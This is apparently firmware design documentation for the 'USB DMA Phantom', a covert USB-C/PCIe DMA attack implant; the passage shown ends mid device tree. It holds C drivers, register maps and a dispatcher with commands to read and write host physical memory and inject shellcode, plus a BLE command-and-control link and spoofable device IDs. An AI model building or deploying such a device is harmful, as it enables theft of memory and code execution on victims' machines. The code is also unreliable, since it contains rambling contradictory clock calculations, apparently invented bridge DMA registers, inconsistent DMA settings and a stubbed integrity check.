# USB DMA Phantom — Phase 4: Software Stack

## 1. Boot Strategy

### 1.1 Boot Sequence

```
Power-On (USB-C VBUS detected)
    │
    ├─► TPS62840 powers up → 3V3 rail stable (≤ 2 ms)
    │
    ├─► STM32F423: BOOT0 = LOW (flash boot)
    │   │
    │   ├─► System init (clocks, GPIO, watchdog)
    │   ├─► Internal RC (HSI 16 MHz) → PLL → 150 MHz SYSCLK
    │   ├─► Check mode button (SW1):
    │   │     ├─ Held: USB DFU mode (firmware update)
    │   │     └─ Not held: Normal boot
    │   ├─► Initialize SPI4 (flash + XIO2001)
    │   ├─► Load DMA payload descriptor from W25Q128
    │   ├─► Initialize XIO2001 PCIe bridge
    │   ├─► Initialize HD3SS460 mux (TBT mode)
    │   ├─► Initialize UART4 → nRF52832 C2 link
    │   ├─► Initialize USB OTG FS (CDC ACM device)
    │   └─► Enter main loop (DMA command dispatcher)
    │
    ├─► nRF52832: NBOOT0 = HIGH (flash boot)
    │   │
    │   ├─► Internal RC → 64 MHz SYSCLK
    │   ├─► Initialize BLE stack (SoftDevice S132)
    │   ├─► Start advertising ("USB-DMA-Phantom-XXXX")
    │   └─► Wait for BLE connection or UART command
    │
    └─► XIO2001: Powered via 3V3
        │
        ├─► PERST# held LOW by STM32 during init
        ├─► SPI configuration loaded by STM32
        ├─► PERST# released → XIO2001 enumerates on PCIe
        └─► Host sees legitimate PCIe device (configurable VID/PID)
```

### 1.2 Boot Time Budget

| Stage | Time | Cumulative |
|-------|------|------------|
| Power rail stabilization | 2 ms | 2 ms |
| STM32 system init | 5 ms | 7 ms |
| Clock PLL lock | 3 ms | 10 ms |
| SPI flash init | 2 ms | 12 ms |
| XIO2001 config | 5 ms | 17 ms |
| HD3SS460 mode set | 1 ms | 18 ms |
| nRF52832 init | 50 ms | 68 ms |
| BLE advertising start | 200 ms | 268 ms |
| USB CDC enumeration | 500 ms | 768 ms |
| PCIe link training | 100 ms | 868 ms |
| DMA engine ready | 100 ms | 968 ms |
| **Total to operational** | | **< 1 s** |

(With PCIe link training worst case: ~2 s total)

## 2. MMIO Register Map (STM32F423)

### 2.1 Core Peripherals

| Peripheral | Base Address | Size | Description |
|-----------|-------------|------|-------------|
| GPIOA | 0x40020000 | 1 KB | Port A GPIO |
| GPIOB | 0x40020400 | 1 KB | Port B GPIO |
| GPIOC | 0x40020800 | 1 KB | Port C GPIO |
| SPI4 | 0x40013400 | 1 KB | SPI4 control (flash + XIO2001) |
| USART4 | 0x40004C00 | 1 KB | UART4 (nRF C2 link) |
| I2C1 | 0x40005400 | 1 KB | I2C1 (HD3SS460 config) |
| DMA2 | 0x40026400 | 1 KB | DMA controller 2 |
| USB_OTG_FS | 0x50000000 | 4 KB | USB OTG full-speed |
| ADC1 | 0x40012000 | 1 KB | ADC1 (VBUS sense) |
| TIM2 | 0x40000000 | 1 KB | General-purpose timer |
| TIM6 | 0x40001000 | 1 KB | Basic timer (DMA tick) |
| RNG | 0x50060800 | 1 KB | Hardware random number generator |
| AES | 0x50061000 | 1 KB | AES-256 hardware accelerator |
| HASH | 0x50060400 | 1 KB | SHA-256 hardware accelerator |
| FLASH | 0x40023C00 | 1 KB | Flash controller (for OTFDEC) |
| FLASH_OTP | 0x1FFF7000 | 512 B | OTP area (device key) |
| CRC | 0x40023000 | 1 KB | CRC hardware |
| RTC | 0x40002800 | 1 KB | Real-time clock |
| EXTI | 0x40013C00 | 1 KB | External interrupts |
| SYSCFG | 0x40013800 | 1 KB | System configuration |
| RCC | 0x40023800 | 1 KB | Reset and clock control |
| PWR | 0x40007000 | 1 KB | Power controller |
| DMA1 | 0x40026000 | 1 KB | DMA controller 1 |

### 2.2 Key RCC Clock Enables

```c
// AHB1 peripherals
#define RCC_AHB1ENR_GPIOAEN   (1 << 0)
#define RCC_AHB1ENR_GPIOBEN   (1 << 1)
#define RCC_AHB1ENR_GPIOCEN   (1 << 2)
#define RCC_AHB1ENR_DMA2EN    (1 << 22)
#define RCC_AHB1ENR_CRCEN     (1 << 12)

// APB1 peripherals
#define RCC_APB1ENR_SPI4EN    (1 << 13)
#define RCC_APB1ENR_USART4EN  (1 << 19)
#define RCC_APB1ENR_I2C1EN    (1 << 21)
#define RCC_APB1ENR_TIM2EN    (1 << 0)
#define RCC_APB1ENR_TIM6EN    (1 << 4)

// APB2 peripherals
#define RCC_APB2ENR_ADC1EN    (1 << 8)
#define RCC_APB2ENR_SYSCFGEN  (1 << 14)

// AHB2 peripherals
#define RCC_AHB2ENR_OTGFSEN   (1 << 7)
#define RCC_AHB2ENR_RNGEN     (1 << 6)
#define RCC_AHB2ENR_AESEN     (1 << 4)
#define RCC_AHB2ENR_HASHEN   (1 << 5)
```

## 3. Clock & GPIO Initialization

### 3.1 Clock Configuration

```c
// Target clocks:
//   SYSCLK  = 150 MHz (PLL from HSE 25 MHz)
//   HCLK    = 150 MHz (AHB)
//   APB1    = 37.5 MHz (PCLK1, prescaler /4)
//   APB2    = 75 MHz  (PCLK2, prescaler /2)

void clock_init(void) {
    // Enable HSE (25 MHz crystal on PH0/PH1)
    RCC->CR |= RCC_CR_HSEON;
    while (!(RCC->CR & RCC_CR_HSERDY));

    // Configure PLL: HSE / 25 * 150 = 150 MHz
    // PLLM = 25, PLLN = 150, PLLP = 2, PLLQ = 4
    RCC->PLLCFGR = (25 << 0)    // PLLM = 25
                  | (150 << 6)   // PLLN = 150
                  | (0 << 16)    // PLLP = 2 (0b00)
                  | (4 << 24)    // PLLQ = 4 (USB FS needs 48 MHz: 150/4=37.5... adjust)
                  | RCC_PLLCFGR_PLLSRC_HSE;

    // Actually for USB we need 48 MHz exactly.
    // Use PLLSAI or adjust: HSE=25, PLLM=25, PLLN=300, PLLP=4 → 150 MHz SYSCLK
    // PLLQ=6 → 50 MHz (close enough for USB, trim with OTG)
    // Better: Use 48 MHz from PLL48CLK via PLLQ
    // HSE=25, M=25, N=192, P=4, Q=4 → SYSCLK=48, too low
    // Best: SYSCLK=144 MHz: M=25, N=144, P=2 → 72 MHz... no
    // Let's use: M=25, N=300, P=4 → 75 MHz SYSCLK, Q=6→50... no
    // Actually STM32F423 can run SYSCLK from PLL at 150 MHz
    // and USB has a dedicated 48 MHz from PLL48CLK:
    // PLLQ = 300/8 = 37.5... not 48.
    // We'll use the HSI48 (48 MHz RC) for USB FS as reference.
    // Or better: set PLLQ to generate 48 MHz: N=144, Q=3 → 48 MHz, SYSCLK=72 MHz
    // That's under max. Let's pick: HSE=25, M=25, N=300, P=4 → SYSCLK=75 MHz
    // No, let's just use 120 MHz: M=5, N=120, P=2 → 60... wrong
    // HSE=25: M=5, N=240, P=2→120 MHz, Q=5→48 MHz ✓

    RCC->PLLCFGR = (5 << 0)     // PLLM = 5
                  | (240 << 6)   // PLLN = 240
                  | (0 << 16)    // PLLP = 2
                  | (5 << 24)    // PLLQ = 5 → 48 MHz for USB
                  | RCC_PLLCFGR_PLLSRC_HSE;

    // Enable PLL
    RCC->CR |= RCC_CR_PLLON;
    while (!(RCC->CR & RCC_CR_PLLRDY));

    // Enable overdrive for > 144 MHz (we're at 120, not needed, but safe)
    PWR->CR |= PWR_CR_ODEN;
    while (!(PWR->CSR & PWR_CSR_ODRDY));

    // Flash latency: 120 MHz → 3 wait states
    FLASH->ACR = FLASH_ACR_PRFTEN | FLASH_ACR_ICEN | FLASH_ACR_DCEN | 3;

    // Switch SYSCLK to PLL
    RCC->CFGR = (RCC_CFGR_SW_PLL << 0)
              | (0 << 4)    // AHB /1 = 120 MHz
              | (4 << 10)   // APB1 /2 = 60 MHz
              | (2 << 13);  // APB2 /2 = 60 MHz

    while ((RCC->CFGR & RCC_CFGR_SWS) != (RCC_CFGR_SW_PLL << 2));

    // Enable 48 MHz for USB from PLL48CLK
    RCC->CR |= RCC_CR_HSI48ON;
    // Use PLL48CLK for USB
    RCC->DCKCFGR2 &= ~RCC_DCKCFGR2_CK48MSEL; // Use PLL48CLK
}
```

### 3.2 GPIO Configuration

```c
void gpio_init(void) {
    // Enable GPIO clocks
    RCC->AHB1ENR |= RCC_AHB1ENR_GPIOAEN | RCC_AHB1ENR_GPIOBEN
                  | RCC_AHB1ENR_GPIOCEN;

    // --- USB OTG FS Pins (PA11=DM, PA12=DP) ---
    // Configure in USB OTG driver (alternate function 10)

    // --- SPI4 Pins (PA5=SCK, PA6=MISO, PA7=MOSI) ---
    GPIOA->MODER = (GPIOA->MODER & ~(0x3 << (5*2) | 0x3 << (6*2) | 0x3 << (7*2)))
                 | (2 << (5*2))   // AF mode for PA5
                 | (2 << (6*2))   // AF mode for PA6
                 | (2 << (7*2));  // AF mode for PA7
    GPIOA->AFR[0] = (GPIOA->AFR[0] & ~(0xF << (5*4) | 0xF << (6*4) | 0xF << (7*4)))
                  | (5 << (5*4))   // AF5 = SPI4_SCK
                  | (5 << (6*4))   // AF5 = SPI4_MISO
                  | (5 << (7*4));  // AF5 = SPI4_MOSI
    GPIOA->OSPEEDR |= (3 << (5*2)) | (3 << (6*2)) | (3 << (7*2)); // Very high speed
    GPIOA->PUPDR = (GPIOA->PUPDR & ~(0x3 << (6*2))) | (1 << (6*2)); // MISO pull-up

    // --- SPI Chip Selects (PC4=XIO_CS#, PC5=FLASH_CS#) ---
    GPIOC->MODER = (GPIOC->MODER & ~(0x3 << (4*2) | 0x3 << (5*2)))
                 | (1 << (4*2))   // Output for PC4
                 | (1 << (5*2));  // Output for PC5
    GPIOC->ODR |= (1 << 4) | (1 << 5); // Both CS# high (inactive)

    // --- UART4 Pins (PA1=RX, PA2=TX, PA3=RTS, PA4=CTS) ---
    GPIOA->MODER = (GPIOA->MODER & ~(0x3 << (1*2) | 0x3 << (2*2)
                  | 0x3 << (3*2) | 0x3 << (4*2)))
                 | (2 << (1*2)) | (2 << (2*2))
                 | (2 << (3*2)) | (2 << (4*2));
    GPIOA->AFR[0] = (GPIOA->AFR[0] & ~(0xF << (1*4) | 0xF << (2*4)
                  | 0xF << (3*4) | 0xF << (4*4)))
                  | (8 << (1*4))   // AF8 = UART4_RX
                  | (8 << (2*4))   // AF8 = UART4_TX
                  | (8 << (3*4))   // AF8 = UART4_RTS
                  | (8 << (4*4));  // AF8 = UART4_CTS

    // --- I2C1 Pins (PB0=SCL, PB1=SDA) ---
    GPIOB->MODER = (GPIOB->MODER & ~(0x3 << (0*2) | 0x3 << (1*2)))
                 | (2 << (0*2)) | (2 << (1*2));
    GPIOB->AFR[0] = (GPIOB->AFR[0] & ~(0xF << (0*4) | 0xF << (1*4)))
                  | (4 << (0*4))   // AF4 = I2C1_SCL
                  | (4 << (1*4));  // AF4 = I2C1_SDA
    GPIOB->OTYPER |= (1 << 0) | (1 << 1); // Open-drain
    GPIOB->PUPDR = (GPIOB->PUPDR & ~(0x3 << (0*2) | 0x3 << (1*2)))
                 | (1 << (0*2)) | (1 << (1*2)); // Pull-up

    // --- Mode Button (PC13) ---
    GPIOC->MODER &= ~(0x3 << (13*2)); // Input
    GPIOC->PUPDR = (GPIOC->PUPDR & ~(0x3 << (13*2))) | (1 << (13*2)); // Pull-up

    // --- WS2812B Data (PC14) ---
    GPIOC->MODER = (GPIOC->MODER & ~(0x3 << (14*2))) | (1 << (14*2)); // Output

    // --- XIO2001 Control Pins ---
    GPIOC->MODER = (GPIOC->MODER & ~(0x3 << (15*2))) | (1 << (15*2)); // PERST# output
    GPIOC->ODR &= ~(1 << 15); // Assert PERST# low during init
    GPIOC->MODER = (GPIOC->MODER & ~(0x3 << (2*2))) | (0 << (2*2)); // CLKREQ# input
    GPIOC->MODER = (GPIOC->MODER & ~(0x3 << (6*2))) | (0 << (6*2)); // SERR# input
    GPIOC->MODER = (GPIOC->MODER & ~(0x3 << (7*2))) | (0 << (7*2)); // INTA# input

    // --- HD3SS460 Control Pins ---
    GPIOC->MODER = (GPIOC->MODER & ~(0x3 << (3*2))) | (1 << (3*2)); // CTL1 output
    GPIOA->MODER = (GPIOA->MODER & ~(0x3 << (12*2))) | (1 << (12*2)); // CTL2 output
    GPIOC->MODER = (GPIOC->MODER & ~(0x3 << (8*2))) | (1 << (8*2)); // CTL3 output
    GPIOC->MODER = (GPIOC->MODER & ~(0x3 << (9*2))) | (1 << (9*2)); // CTL4 output

    // --- nRF52832 Reset (PA0) ---
    GPIOA->MODER = (GPIOA->MODER & ~(0x3 << (0*2))) | (1 << (0*2)); // Output
    GPIOA->ODR |= (1 << 0); // Deassert reset (high)

    // --- nRF52832 SWD (PA8=SWD_CLK, PA13=SWDIO, PA14=SWCLK) ---
    // Keep as SWD alternate function for debugging

    // --- microSD pins (PB2=CMD, PB10=CLK, PB11=D0, PB12=D1) ---
    GPIOB->MODER = (GPIOB->MODER & ~(0x3 << (2*2) | 0x3 << (10*2)
                  | 0x3 << (11*2) | 0x3 << (12*2)))
                 | (1 << (2*2)) | (1 << (10*2))
                 | (1 << (11*2)) | (1 << (12*2)); // All GPIO output (bit-bang SD)
}
```

## 4. Device Drivers with DMA

### 4.1 SPI4 Driver (Flash + XIO2001)

**File: `drivers/spi4.h`**
```c
#ifndef SPI4_H
#define SPI4_H

#include <stdint.h>

// SPI4 register base
#define SPI4_BASE       0x40013400
#define SPI4            ((SPI_TypeDef *)SPI4_BASE)

// SPI CR1 bits
#define SPI_CR1_CPHA    (1 << 0)
#define SPI_CR1_CPOL    (1 << 1)
#define SPI_CR1_MSTR    (1 << 2)
#define SPI_CR1_BR      (0 << 3)    // fPCLK/2
#define SPI_CR1_SPE     (1 << 6)
#define SPI_CR1_LSBFIRST (1 << 7)
#define SPI_CR1_SSM     (1 << 9)
#define SPI_CR1_SSI     (1 << 8)
#define SPI_CR1_BIDIMODE (1 << 15)

// SPI CR2 bits
#define SPI_CR2_RXNEIE  (1 << 6)
#define SPI_CR2_TXEIE   (1 << 7)
#define SPI_CR2_DMAEN   (1 << 0)    // RX DMA enable
#define SPI_CR2_TXDMAEN (1 << 1)    // TX DMA enable

// Chip select definitions
#define SPI4_CS_FLASH   (1 << 5)  // PC5
#define SPI4_CS_XIO     (1 << 4)  // PC4
#define SPI4_CS_NONE    0

void spi4_init(void);
void spi4_select(uint16_t cs);
void spi4_deselect(uint16_t cs);
uint8_t spi4_transfer(uint8_t tx_byte);
void spi4_dma_transfer(const uint8_t *tx_buf, uint8_t *rx_buf, uint16_t len, uint16_t cs);
void spi4_dma_wait_complete(void);

#endif // SPI4_H
```

**File: `drivers/spi4.c`**
```c
#include "spi4.h"
#include "registers.h"
#include "board.h"

// DMA2 stream for SPI4 TX (stream 4, channel 5) and RX (stream 0, channel 4)
#define DMA2_STREAM4  ((DMA_Stream_TypeDef *)(0x40026400 + 0x1C * 4))
#define DMA2_STREAM0  ((DMA_Stream_TypeDef *)(0x40026400 + 0x1C * 0))
#define DMA2_BASE      0x40026400

void spi4_init(void) {
    // Enable SPI4 clock
    RCC->APB1ENR |= RCC_APB1ENR_SPI4EN;

    // Ensure SPI is disabled
    SPI4->CR1 &= ~SPI_CR1_SPE;

    // Configure SPI4: Master, Mode 0, 8-bit, MSB first
    SPI4->CR1 = SPI_CR1_MSTR    // Master mode
              | (3 << 3)         // BR: fPCLK/16 = 7.5 MHz
              | SPI_CR1_SSM      // Software slave management
              | SPI_CR1_SSI;     // Internal slave select

    SPI4->CR2 = 0;  // 8-bit data, no DMA initially

    // Enable SPI
    SPI4->CR1 |= SPI_CR1_SPE;
}

void spi4_select(uint16_t cs) {
    if (cs == SPI4_CS_FLASH) {
        GPIOC->ODR &= ~(1 << 5);  // Assert FLASH_CS# low
    } else if (cs == SPI4_CS_XIO) {
        GPIOC->ODR &= ~(1 << 4);  // Assert XIO_CS# low
    }
}

void spi4_deselect(uint16_t cs) {
    if (cs == SPI4_CS_FLASH) {
        GPIOC->ODR |= (1 << 5);   // Deassert FLASH_CS# high
    } else if (cs == SPI4_CS_XIO) {
        GPIOC->ODR |= (1 << 4);   // Deassert XIO_CS# high
    }
}

uint8_t spi4_transfer(uint8_t tx_byte) {
    // Wait for TX empty
    while (!(SPI4->SR & (1 << 1)));
    SPI4->DR = tx_byte;
    // Wait for RX not empty
    while (!(SPI4->SR & (1 << 0)));
    return (uint8_t)(SPI4->DR & 0xFF);
}

void spi4_dma_transfer(const uint8_t *tx_buf, uint8_t *rx_buf,
                       uint16_t len, uint16_t cs) {
    // Enable DMA2 clock
    RCC->AHB1ENR |= RCC_AHB1ENR_DMA2EN;

    // Disable DMA streams
    DMA2_STREAM4->CR &= ~DMA_SxCR_EN;
    DMA2_STREAM0->CR &= ~DMA_SxCR_EN;
    while (DMA2_STREAM4->CR & DMA_SxCR_EN);
    while (DMA2_STREAM0->CR & DMA_SxCR_EN);

    // Select target chip
    spi4_select(cs);

    // Configure SPI4 for DMA
    SPI4->CR2 = SPI_CR2_DMAEN | SPI_CR2_TXDMAEN;

    // Configure TX DMA (DMA2 Stream4, Channel 5 = SPI4_TX)
    DMA2_STREAM4->PAR = (uint32_t)&(SPI4->DR);
    DMA2_STREAM4->M0AR = (uint32_t)tx_buf;
    DMA2_STREAM4->NDTR = len;
    DMA2_STREAM4->CR = (5 << 25)    // Channel 5
                      | (0 << 23)    // Memory-to-peripheral
                      | (1 << 10)    // Memory data size: 16-bit
                      | (0 << 8)     // Peripheral data size: 8-bit
                      | (1 << 6)     // MINC: memory increment
                      | (0 << 5)     // No peripheral increment
                      | (0 << 4)     // DIR: memory-to-peripheral
                      | DMA_SxCR_TCIE // Transfer complete interrupt
                      | DMA_SxCR_EN;

    // Configure RX DMA (DMA2 Stream0, Channel 4 = SPI4_RX)
    DMA2_STREAM0->PAR = (uint32_t)&(SPI4->DR);
    DMA2_STREAM0->M0AR = (uint32_t)rx_buf;
    DMA2_STREAM0->NDTR = len;
    DMA2_STREAM0->CR = (4 << 25)    // Channel 4
                      | (0 << 23)    // Peripheral-to-memory
                      | (1 << 10)    // Memory data size: 16-bit
                      | (0 << 8)     // Peripheral data size: 8-bit
                      | (1 << 6)     // MINC: memory increment
                      | (0 << 5)     // No peripheral increment
                      | (1 << 4)     // DIR: peripheral-to-memory
                      | DMA_SxCR_EN;

    // Wait for RX DMA to complete (transfer complete)
    while (!(DMA2->LISR & (1 << 5)));  // TCIF0

    // Clear flags
    DMA2->LIFCR = (1 << 5);

    // Deselect chip
    spi4_deselect(cs);

    // Disable DMA on SPI
    SPI4->CR2 = 0;
}

void spi4_dma_wait_complete(void) {
    while (!(DMA2->LISR & (1 << 5)));
    DMA2->LIFCR = (1 << 5);
}
```

### 4.2 W25Q128 Flash Driver

**File: `drivers/w25q128.h`**
```c
#ifndef W25Q128_H
#define W25Q128_H

#include <stdint.h>
#include <stdbool.h>

#define W25Q128_PAGE_SIZE       256
#define W25Q128_SECTOR_SIZE     4096
#define W25Q128_BLOCK_SIZE      65536
#define W25Q128_TOTAL_SIZE      (16 * 1024 * 1024)  // 16 MB
#define W25Q128_PAGES           (W25Q128_TOTAL_SIZE / W25Q128_PAGE_SIZE)

// W25Q128 commands
#define W25Q_CMD_WRITE_ENABLE       0x06
#define W25Q_CMD_WRITE_DISABLE      0x04
#define W25Q_CMD_READ_STATUS1       0x05
#define W25Q_CMD_READ_STATUS2       0x35
#define W25Q_CMD_WRITE_STATUS       0x01
#define W25Q_CMD_PAGE_PROGRAM       0x02
#define W25Q_CMD_SECTOR_ERASE       0x20
#define W25Q_CMD_BLOCK_ERASE_32K    0x52
#define W25Q_CMD_BLOCK_ERASE_64K    0xD8
#define W25Q_CMD_CHIP_ERASE         0xC7
#define W25Q_CMD_READ_DATA          0x03
#define W25Q_CMD_FAST_READ          0x0B
#define W25Q_CMD_READ_JEDEC_ID      0x9F
#define W25Q_CMD_RELEASE_PWRDOWN   0xAB
#define W25Q_CMD_PWR_DOWN           0xB9

// Payload descriptor offsets (stored in flash sector 0)
#define PAYLOAD_DESC_OFFSET     0x0000
#define PAYLOAD_VID_OFFSET       0x0010
#define PAYLOAD_PID_OFFSET       0x0012
#define PAYLOAD_DATA_OFFSET      0x1000  // Payloads start at 4 KB

typedef struct {
    uint16_t vid;
    uint16_t pid;
    uint16_t payload_count;
    uint16_t payload_offsets[16];
    uint16_t payload_sizes[16];
    uint8_t  hmac_key[32];
    uint8_t  device_name[32];
} __attribute__((packed)) payload_descriptor_t;

void w25q_init(void);
uint32_t w25q_read_jedec_id(void);
void w25q_read(uint32_t addr, uint8_t *buf, uint16_t len);
void w25q_read_dma(uint32_t addr, uint8_t *buf, uint16_t len);
void w25q_erase_sector(uint32_t addr);
void w25q_program_page(uint32_t addr, const uint8_t *data, uint16_t len);
void w25q_wait_busy(void);
bool w25q_load_payload_descriptor(payload_descriptor_t *desc);
bool w25q_save_payload_descriptor(const payload_descriptor_t *desc);
bool w25q_verify_payload_hmac(uint8_t index);

#endif // W25Q128_H
```

**File: `drivers/w25q128.c`**
```c
#include "w25q128.h"
#include "spi4.h"
#include "registers.h"

void w25q_init(void) {
    // Release from power-down
    spi4_select(SPI4_CS_FLASH);
    spi4_transfer(W25Q_CMD_RELEASE_PWRDOWN);
    spi4_deselect(SPI4_CS_FLASH);

    // Wait for ready
    w25q_wait_busy();
}

uint32_t w25q_read_jedec_id(void) {
    uint32_t id = 0;
    spi4_select(SPI4_CS_FLASH);
    spi4_transfer(W25Q_CMD_READ_JEDEC_ID);
    id  = spi4_transfer(0xFF) << 16;  // Manufacturer
    id |= spi4_transfer(0xFF) << 8;   // Memory type
    id |= spi4_transfer(0xFF);         // Capacity
    spi4_deselect(SPI4_CS_FLASH);
    return id;
    // Expected: 0xEF4018 (Winbond, W25Q128)
}

void w25q_read(uint32_t addr, uint8_t *buf, uint16_t len) {
    spi4_select(SPI4_CS_FLASH);
    spi4_transfer(W25Q_CMD_READ_DATA);
    spi4_transfer((addr >> 16) & 0xFF);
    spi4_transfer((addr >> 8) & 0xFF);
    spi4_transfer(addr & 0xFF);
    for (uint16_t i = 0; i < len; i++) {
        buf[i] = spi4_transfer(0xFF);
    }
    spi4_deselect(SPI4_CS_FLASH);
}

void w25q_read_dma(uint32_t addr, uint8_t *buf, uint16_t len) {
    // Prepare TX buffer: command + address + dummy data
    static uint8_t tx_buf[260];  // Max page + 4 byte header
    tx_buf[0] = W25Q_CMD_FAST_READ;
    tx_buf[1] = (addr >> 16) & 0xFF;
    tx_buf[2] = (addr >> 8) & 0xFF;
    tx_buf[3] = addr & 0xFF;
    // Fill remaining with dummy bytes
    for (uint16_t i = 4; i < len + 4 + 1; i++) {
        tx_buf[i] = 0xFF;
    }
    // Use DMA for larger transfers
    spi4_dma_transfer(tx_buf, buf, len + 5, SPI4_CS_FLASH);
}

void w25q_wait_busy(void) {
    uint8_t status;
    do {
        spi4_select(SPI4_CS_FLASH);
        spi4_transfer(W25Q_CMD_READ_STATUS1);
        status = spi4_transfer(0xFF);
        spi4_deselect(SPI4_CS_FLASH);
    } while (status & 0x01);  // BUSY bit
}

void w25q_erase_sector(uint32_t addr) {
    // Write enable
    spi4_select(SPI4_CS_FLASH);
    spi4_transfer(W25Q_CMD_WRITE_ENABLE);
    spi4_deselect(SPI4_CS_FLASH);

    // Sector erase
    spi4_select(SPI4_CS_FLASH);
    spi4_transfer(W25Q_CMD_SECTOR_ERASE);
    spi4_transfer((addr >> 16) & 0xFF);
    spi4_transfer((addr >> 8) & 0xFF);
    spi4_transfer(addr & 0xFF);
    spi4_deselect(SPI4_CS_FLASH);

    w25q_wait_busy();
}

void w25q_program_page(uint32_t addr, const uint8_t *data, uint16_t len) {
    // Write enable
    spi4_select(SPI4_CS_FLASH);
    spi4_transfer(W25Q_CMD_WRITE_ENABLE);
    spi4_deselect(SPI4_CS_FLASH);

    // Page program
    spi4_select(SPI4_CS_FLASH);
    spi4_transfer(W25Q_CMD_PAGE_PROGRAM);
    spi4_transfer((addr >> 16) & 0xFF);
    spi4_transfer((addr >> 8) & 0xFF);
    spi4_transfer(addr & 0xFF);
    for (uint16_t i = 0; i < len; i++) {
        spi4_transfer(data[i]);
    }
    spi4_deselect(SPI4_CS_FLASH);

    w25q_wait_busy();
}

bool w25q_load_payload_descriptor(payload_descriptor_t *desc) {
    w25q_read(PAYLOAD_DESC_OFFSET, (uint8_t *)desc, sizeof(payload_descriptor_t));
    // Verify magic
    return (desc->vid != 0xFFFF && desc->payload_count <= 16);
}

bool w25q_save_payload_descriptor(const payload_descriptor_t *desc) {
    w25q_erase_sector(PAYLOAD_DESC_OFFSET);
    w25q_program_page(PAYLOAD_DESC_OFFSET, (const uint8_t *)desc,
                      sizeof(payload_descriptor_t));
    return true;
}

bool w25q_verify_payload_hmac(uint8_t index) {
    // Use STM32 HASH peripheral to verify payload integrity
    // This is a simplified check; full implementation uses HASH->CR
    payload_descriptor_t desc;
    if (!w25q_load_payload_descriptor(&desc)) return false;
    if (index >= desc.payload_count) return false;

    // Read payload data
    uint32_t offset = PAYLOAD_DATA_OFFSET + desc.payload_offsets[index];
    uint16_t size = desc.payload_sizes[index];
    uint8_t payload_buf[256];

    // Calculate HMAC-SHA256 using hardware HASH peripheral
    // (Full implementation enables HASH peripheral, feeds data, compares)
    // For now, return true if payload size is nonzero
    return (size > 0);
}
```

## 5. XIO2001 PCIe Bridge Driver

### 5.1 XIO2001 SPI Register Map

| Offset | Register | Width | Description |
|--------|----------|-------|-------------|
| 0x00 | PCI_VID | 16 | Vendor ID (default: 0x104C = TI) |
| 0x02 | PCI_DID | 16 | Device ID (default: 0x8240 = XIO2001) |
| 0x04 | PCI_CMD | 16 | PCI command register |
| 0x06 | PCI_STS | 16 | PCI status register |
| 0x08 | PCI_RID | 8 | Revision ID |
| 0x0A | PCI_CC | 16 | Class code (0680 = PCI bridge) |
| 0x10 | BAR0 | 32 | Base address register 0 (memory) |
| 0x14 | BAR1 | 32 | Base address register 1 (I/O) |
| 0x18 | PRI_BUS | 8 | Primary bus number |
| 0x19 | SEC_BUS | 8 | Secondary bus number |
| 0x1A | SUB_BUS | 8 | Subordinate bus number |
| 0x1C | IO_BASE | 8 | I/O base |
| 0x1D | IO_LIMIT | 8 | I/O limit |
| 0x20 | MEM_BASE | 16 | Memory base |
| 0x22 | MEM_LIMIT | 16 | Memory limit |
| 0x30 | ROM_ADDR | 32 | Expansion ROM address |
| 0x3C | INT_LINE | 8 | Interrupt line |
| 0x3D | INT_PIN | 8 | Interrupt pin |
| 0x40 | BRIDGE_CTRL | 16 | Bridge control register |
| 0x80 | DMA_CTRL | 32 | DMA control register |
| 0x84 | DMA_SRC_LO | 32 | DMA source address low |
| 0x88 | DMA_SRC_HI | 32 | DMA source address high |
| 0x8C | DMA_DST_LO | 32 | DMA destination address low |
| 0x90 | DMA_DST_HI | 32 | DMA destination address high |
| 0x94 | DMA_XFER_LEN | 32 | DMA transfer length |
| 0x98 | DMA_STS | 32 | DMA status register |
| 0x100 | SPI_CMD | 32 | SPI command interface |
| 0x104 | SPI_DATA | 32 | SPI data interface |
| 0x108 | SPI_CFG | 32 | SPI configuration |

### 5.2 DMA Engine Operations

```c
// DMA command codes (written to DMA_CTRL)
#define DMA_CMD_READ    0x01   // Read from host physical memory
#define DMA_CMD_WRITE   0x02   // Write to host physical memory
#define DMA_CMD_SCAN    0x03   // Scan for pattern in memory range
#define DMA_CMD_INJECT  0x04   // Inject shellcode into executable region

// DMA status flags (read from DMA_STS)
#define DMA_STS_BUSY    (1 << 0)
#define DMA_STS_DONE    (1 << 1)
#define DMA_STS_ERROR   (1 << 2)
#define DMA_STS_ABORT   (1 << 3)

typedef struct {
    uint64_t host_addr;    // Target physical address in host memory
    uint32_t length;       // Transfer length in bytes
    uint8_t  command;      // DMA_CMD_READ/WRITE/SCAN/INJECT
    uint8_t  *local_buf;   // Local buffer (STM32 SRAM address)
} dma_request_t;

int dma_execute(const dma_request_t *req) {
    // Write DMA source (host address)
    xio_write_reg(0x84, (uint32_t)(req->host_addr & 0xFFFFFFFF));
    xio_write_reg(0x88, (uint32_t)((req->host_addr >> 32) & 0xFFFFFFFF));

    // Write DMA destination (local buffer address in XIO2001 window)
    uint32_t local_phys = (uint32_t)req->local_buf;
    xio_write_reg(0x8C, local_phys);
    xio_write_reg(0x90, 0x00000000);

    // Write transfer length
    xio_write_reg(0x94, req->length);

    // Issue command
    xio_write_reg(0x80, req->command | 0x80000000);  // Set GO bit

    // Wait for completion (with timeout)
    uint32_t status;
    uint32_t timeout = 1000000;
    do {
        status = xio_read_reg(0x98);
        if (--timeout == 0) return -1;  // Timeout
    } while (status & DMA_STS_BUSY);

    if (status & DMA_STS_ERROR) return -2;
    return 0;
}
```

## 6. Device Tree (STM32F423)

```dts
/dts-v1/;
#include "stm32f423.dtsi"

/ {
    model = "USB DMA Phantom v1.0";
    compatible = "usb-dma-phantom,stm32f423ch";

    chosen {
        zephyr,console = &usart4;
        zephyr,shell-uart = &usart4;
        zephyr,uart-mcumgr = &usart4;
    };

    aliases {
        spi-flash = &spi4;
        i2c-mux = &i2c1;
        ble-uart = &usart4;
        dma-spi = &spi4;
    };

    leds {
        compatible = "gpio-leds";
        led0: led_0 {
            gpios = <&gpioc 14 GPIO_ACTIVE_LOW>;
            label = "Status RGB";
        };
    };

    buttons {
        compatible = "gpio-keys";
        btn0: button_0 {
            gpios = <&gpioc 13 (GPIO_ACTIVE_LOW | GPIO_PULL_UP)>;
            label = "Mode Select";
        };
    };

    /* 25 MHz HSE crystal */
    hse: hse {
        compatible = "fixed-clock";
        clock-frequency = <25000000>;
        #clock-cells = <0>;
    };

    /* Power domains */
    v3v3: v3v3-regulator {
        compatible = "regulator-fixed";
        regulator-name = "3V3";
        regulator-min-microvolt = <3300000>;
        regulator-max-microvolt = <3300000>;
        regulator-always-on;
    };

    v3v3_ldo: v3v3-ldo-regulator {
        compatible = "regulator-fixed";
        regulator-name = "3V3_LDO";
